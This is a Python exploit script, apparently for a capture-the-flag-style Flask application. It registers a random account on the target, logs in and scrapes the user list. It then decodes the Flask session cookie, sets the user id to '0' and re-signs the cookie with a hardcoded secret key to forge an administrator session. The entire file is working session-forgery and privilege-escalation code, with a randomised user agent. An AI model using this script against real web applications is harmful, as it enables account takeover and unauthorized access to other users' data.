#!/usr/bin/python

from random_username.generate import generate_username
from fake_useragent import UserAgent
from requests import Session
from flask_unsign import session as flask_session
from string import ascii_letters, digits
from random import choices
from bs4 import BeautifulSoup
from sys import argv, settrace

USERNAME = generate_username(1)[0]
PASSWORD = ''.join(choices(ascii_letters + digits, k=8))
USER_AGENT = UserAgent().random
SECRET_KEY = 'y0u-w1ll-n3v3r-gu355'


def retrieve_csrf_token(s: Session, url: str) -> str:
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Retrieved csrf_token from {url}')
    return soup.find(attrs={'id': 'csrf_token'})['value']


def register(s: Session, url: str) -> None:
    url += '/register'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Registered')


def login(s: Session, url: str) -> None:
    url += '/login'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Logged in')


def retrieve_users(s: Session, url: str) -> list:
    url += '/users'
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    return [user.text for user in soup.find_all(attrs={'class': 'lead'})]


def main() -> None:
    try:
        url = f'http://{argv[1]}:5000'
        s = Session()
        s.headers['User-Agent'] = USER_AGENT
        register(s, url)
        login(s, url)
        users = retrieve_users(s, url)
        current_session = flask_session.decode(value=s.cookies['session'])
        current_session['_user_id'] = '0'
        current_session = flask_session.sign(
            value=current_session,
            secret=SECRET_KEY,
            salt='cookie-session',
            legacy=False
        )
        print(current_session)
    except:
        print('[-] Something went wrong')


if __name__ == '__main__':
    main()
